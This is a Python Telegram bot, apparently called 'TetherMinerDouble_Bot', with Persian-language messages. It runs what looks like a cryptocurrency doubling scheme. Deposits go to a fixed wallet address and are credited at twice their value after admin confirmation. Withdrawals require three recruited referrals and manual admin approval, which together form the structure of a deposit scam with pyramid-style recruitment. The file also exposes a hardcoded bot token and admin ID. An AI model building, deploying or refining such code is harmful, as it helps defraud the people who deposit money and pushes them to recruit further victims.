import logging
import sqlite3
from telegram import Update
from telegram import InlineKeyboardButton
from telegram import InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder
from telegram.ext import CallbackQueryHandler
from telegram.ext import CommandHandler
from telegram.ext import MessageHandler
from telegram.ext import ConversationHandler
from telegram.ext import ContextTypes
from telegram.ext import filters

TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo"
ADMIN_ID = 6644712689

logging.basicConfig(level=logging.INFO)

DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WALLET_ADDRESS, SUPPORT_MESSAGE, ADMIN_REPLY = range(6)

conn = sqlite3.connect("users.db", check_same_thread=False)
cur = conn.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, balance REAL, referrals TEXT)")
conn.commit()

def get_user(user_id, username):
    cur.execute("SELECT * FROM users WHERE id=?", (user_id,))
    row = cur.fetchone()
    if not row:
        cur.execute("INSERT INTO users (id, username, balance, referrals) VALUES (?, ?, ?, ?)", (user_id, username, 0, ""))
        conn.commit()

def update_balance(user_id, amount):
    cur.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (amount, user_id))
    conn.commit()

def get_balance(user_id):
    cur.execute("SELECT balance FROM users WHERE id = ?", (user_id,))
    row = cur.fetchone()
    return row[0] if row else 0

def add_referral(referrer_id, new_user_id):
    cur.execute("SELECT referrals FROM users WHERE id = ?", (referrer_id,))
    row = cur.fetchone()
    if row and str(new_user_id) not in row[0].split(","):
        updated = row[0] + f",{new_user_id}" if row[0] else str(new_user_id)
        cur.execute("UPDATE users SET referrals = ? WHERE id = ?", (updated, referrer_id))
        conn.commit()
        return True
    return False

def get_referral_count(user_id):
    cur.execute("SELECT referrals FROM users WHERE id = ?", (user_id,))
    row = cur.fetchone()
    return len(row[0].split(",")) if row and row[0] else 0

def get_referral_link(user_id):
    return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Deposit", callback_data="deposit"),
            InlineKeyboardButton("Withdrawal", callback_data="withdraw"),
            InlineKeyboardButton("Balance", callback_data="balance")
        ],
        [
            InlineKeyboardButton("Referral", callback_data="referral"),
            InlineKeyboardButton("Support", callback_data="support")
        ]
    ])

def back_button(callback_data="menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data=callback_data)]])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id, user.username or user.full_name)
    if context.args:
        referrer_id = int(context.args[0])
        if referrer_id != user.id and add_referral(referrer_id, user.id):
            await context.bot.send_message(referrer_id, f"کاربر @{user.username or user.full_name} با لینک شما عضو شد.")
    await update.message.reply_text("خوش آمدید به ربات!", reply_markup=main_menu_keyboard())

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username or query.from_user.full_name
    get_user(user_id, username)

    match query.data:
        case "menu":
            await query.message.edit_text("بازگشت به منوی اصلی", reply_markup=main_menu_keyboard())
        case "deposit":
            await query.message.edit_text("مقدار واریز را وارد کنید:", reply_markup=back_button())
            return DEPOSIT_AMOUNT
        case "withdraw":
            if get_referral_count(user_id) < 3:
                await query.message.edit_text(f"برای برداشت حداقل ۳ زیرمجموعه نیاز است.\n{get_referral_link(user_id)}", reply_markup=back_button())
                return ConversationHandler.END
            await query.message.edit_text("مقدار برداشت را وارد کنید:", reply_markup=back_button())
            return WITHDRAW_AMOUNT
        case "balance":
            await query.message.edit_text(f"موجودی شما: {get_balance(user_id)} دلار", reply_markup=back_button())
        case "referral":
            count = get_referral_count(user_id)
            bonus = count * 1.5
            update_balance(user_id, bonus)
            await query.message.edit_text(
                f"لینک دعوت: {get_referral_link(user_id)}\nتعداد: {count}\nپاداش: {bonus} دلار\nموجودی: {get_balance(user_id)} دلار",
                reply_markup=back_button()
            )
        case "support":
            await query.message.edit_text("پیغام خود را ارسال کنید:", reply_markup=back_button())
            return SUPPORT_MESSAGE

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        if amount < 5:
            await update.message.reply_text("حداقل ۵ دلار.", reply_markup=main_menu_keyboard())
            return ConversationHandler.END
        context.user_data["deposit_amount"] = amount
        await update.message.reply_text(
            "به آدرس زیر واریز و اسکرین‌شات ارسال کنید:\n\n`0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB`",
            reply_markup=back_button("deposit"), parse_mode="Markdown"
        )
        return DEPOSIT_PROOF
    except:
        await update.message.reply_text("عدد نامعتبر.", reply_markup=back_button("deposit"))
        return ConversationHandler.END

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    amount = context.user_data.get("deposit_amount", 0)
    proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "")
    keyboard = [
        [InlineKeyboardButton("تایید", callback_data=f"confirm_deposit|{user.id}|{amount}"),
         InlineKeyboardButton("رد", callback_data=f"reject_deposit|{user.id}")]
    ]
    await context.bot.send_message(ADMIN_ID,
        f"درخواست واریز از @{user.username or user.full_name}:\nمقدار: {amount}\nمدرک:\n{proof}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("در انتظار تأیید ادمین.")
    return ConversationHandler.END

async def confirm_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id, amount = update.callback_query.data.split("|")
    update_balance(int(user_id), float(amount) * 2)
    await context.bot.send_message(int(user_id), "واریز تأیید شد.")
    await update.callback_query.message.delete()

async def reject_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id = update.callback_query.data.split("|")
    await context.bot.send_message(int(user_id), "واریز شما رد شد.")
    await update.callback_query.message.delete()

async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        user_id = update.effective_user.id
        if amount > get_balance(user_id):
            await update.message.reply_text("موجودی کافی نیست.", reply_markup=main_menu_keyboard())
            return ConversationHandler.END
        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text("آدرس کیف پول را وارد کنید:", reply_markup=back_button("withdraw"))
        return WALLET_ADDRESS
    except:
        await update.message.reply_text("مقدار نامعتبر.", reply_markup=back_button("withdraw"))
        return ConversationHandler.END

async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    amount = context.user_data["withdraw_amount"]
    address = update.message.text
    keyboard = [
        [InlineKeyboardButton("تایید", callback_data=f"confirm_withdraw|{user.id}|{amount}"),
         InlineKeyboardButton("رد", callback_data=f"reject_withdraw|{user.id}")]
    ]
    await context.bot.send_message(ADMIN_ID,
        f"درخواست برداشت از @{user.username or user.full_name}:\nمقدار: {amount}\nآدرس: {address}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("در انتظار بررسی ادمین.")
    return ConversationHandler.END

async def confirm_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id, amount = update.callback_query.data.split("|")
    update_balance(int(user_id), -float(amount))
    await context.bot.send_message(int(user_id), "برداشت تایید شد.")
    await update.callback_query.message.delete()

async def reject_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id = update.callback_query.data.split("|")
    await context.bot.send_message(int(user_id), "برداشت رد شد.")
    await update.callback_query.message.delete()

async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.message.text
    context.user_data["support_from"] = user.id
    await context.bot.send_message(ADMIN_ID,
        f"پیام پشتیبانی از @{user.username or user.full_name}:\n{msg}",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("پاسخ", callback_data=f"reply_support|{user.id}")]])
    )
    await update.message.reply_text("پیام ارسال شد.")
    return ConversationHandler.END

async def reply_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["reply_to"] = int(update.callback_query.data.split("|")[1])
    await update.callback_query.message.reply_text("پاسخ را وارد کنید:")
    return ADMIN_REPLY

async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_text = update.message.text
    user_id = context.user_data.get("reply_to")
    if user_id:
        await context.bot.send_message(user_id, f"پاسخ ادمین:\n{reply_text}")
        await update.message.reply_text("پاسخ ارسال شد.")
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button)],
        states={
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
            DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
            WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
            SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
            ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
        },
        fallbacks=[]
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(confirm_deposit, pattern="^confirm_deposit"))
    app.add_handler(CallbackQueryHandler(reject_deposit, pattern="^reject_deposit"))
    app.add_handler(CallbackQueryHandler(confirm_withdraw, pattern="^confirm_withdraw"))
    app.add_handler(CallbackQueryHandler(reject_withdraw, pattern="^reject_withdraw"))
    app.add_handler(CallbackQueryHandler(reply_support, pattern="^reply_support"))
    app.add_handler(CallbackQueryHandler(button))
    app.run_polling()

if __name__ == "__main__":
    main()
